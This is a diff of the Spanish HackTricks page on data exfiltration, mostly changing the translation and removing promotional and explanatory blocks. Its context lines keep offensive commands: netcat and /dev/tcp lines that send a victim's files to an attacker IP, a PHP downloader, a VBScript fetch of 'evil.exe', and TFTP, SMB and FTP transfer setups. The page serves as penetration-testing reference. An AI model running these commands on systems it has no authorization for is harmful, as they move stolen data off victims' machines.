@@ -1,33 +1,25 @@
 # Exfiltración
 
 {% hint style="success" %}
-Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Apoya a HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos en** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Grupo de Seguridad Try Hard**
+## Dominios comúnmente en la lista blanca para exfiltrar información
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Dominios comúnmente permitidos para exfiltrar información
-
-Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente permitidos que pueden ser abusados
-
-## Copiar y Pegar Base64
+## Copiar\&Pegar Base64
 
 **Linux**
 ```bash
@@ -66,7 +58,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Subir archivos
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer imprimiendo GET y POSTs (también encabezados)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Módulo de Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### Cliente de **Windows**
+### **Cliente** de Windows
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -171,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-O crear un recurso compartido smb **utilizando samba**:
+O crea un recurso compartido smb **usando samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -186,37 +178,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
-
-## Introduction
-
-Exfiltration is the unauthorized transfer of data from a computer. Attackers exfiltrate data to maintain access, sell it on the black market, or use it for other malicious purposes. Exfiltration techniques can vary depending on the target environment and the goals of the attacker.
-
-## Windows Exfiltration Techniques
-
-### Common Techniques
-
-- **Web-Based Exfiltration**: Attackers can use web applications to exfiltrate data by uploading it to external servers or sending it via web requests.
-  
-- **DNS Exfiltration**: Attackers can encode data within DNS requests to exfiltrate information from a compromised system.
-
-- **Email Exfiltration**: Attackers can send sensitive data as email attachments or in the body of emails to external email accounts.
-
-- **Exfiltration Over C2 Channels**: Attackers can exfiltrate data over command-and-control (C2) channels established with malware on the compromised system.
-
-### Advanced Techniques
-
-- **Steganography**: Attackers can hide data within images, audio files, or other types of files to exfiltrate information without detection.
-
-- **Data Compression**: Attackers can compress data before exfiltrating it to reduce the size of the transferred files and avoid detection.
-
-- **Data Encryption**: Attackers can encrypt exfiltrated data to prevent detection by security controls.
-
-- **Fileless Exfiltration**: Attackers can exfiltrate data without writing it to disk, making detection more challenging for security tools.
-
-## Detection and Prevention
-
-Detecting exfiltration attempts can be challenging due to the variety of techniques available to attackers. Organizations can implement network monitoring, endpoint security solutions, and user awareness training to help detect and prevent data exfiltration.
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -239,17 +201,13 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
-
-### Netcat
-
-Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can be used to transfer files, port scanning, banner grabbing, and as a backdoor. Netcat can be used to exfiltrate data by connecting to a remote server and sending the data over the network.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Descargar archivo desde la víctima
+### Descargar archivo de la víctima
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -261,7 +219,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Gracias a **@BinaryShadow\_**
+gracias a **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -283,15 +241,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con Python:
+Si puedes enviar datos a un servidor SMTP, puedes crear un SMTP para recibir los datos con python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Por defecto en XP y 2003 (en otros sistemas operativos necesita ser agregado explícitamente durante la instalación)
+Por defecto en XP y 2003 (en otros debe ser agregado explícitamente durante la instalación)
 
-En Kali, **iniciar el servidor TFTP**:
+En Kali, **iniciar servidor TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -303,21 +261,17 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-En **víctima**, conectarse al servidor Kali:
+En **victim**, conéctate al servidor Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descarga un archivo con un PHP oneliner:
+Descargar un archivo con un oneliner de PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### Visual Basic Scripting Edition (VBScript)
-
-VBScript is a lightweight scripting language developed by Microsoft that is modeled on Visual Basic. It is commonly used for client-side scripting in web development and can also be used for server-side scripting through Windows Script Host (WSH). VBScript is often executed within HTML documents to perform tasks such as form validation or interacting with the user.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -355,14 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hexadecimal**. Esto significa que al proporcionar un hexadecimal de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblaje de archivos de hasta 64 kb de tamaño**.
+El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que al proporcionar un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblar archivos de hasta 64 kb de tamaño**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
-Luego copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
+Luego, copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -370,24 +323,17 @@ Luego copia y pega el texto en la ventana de comandos de Windows y se creará un
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Apoya a HackTricks</summary>
 
-* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
-```
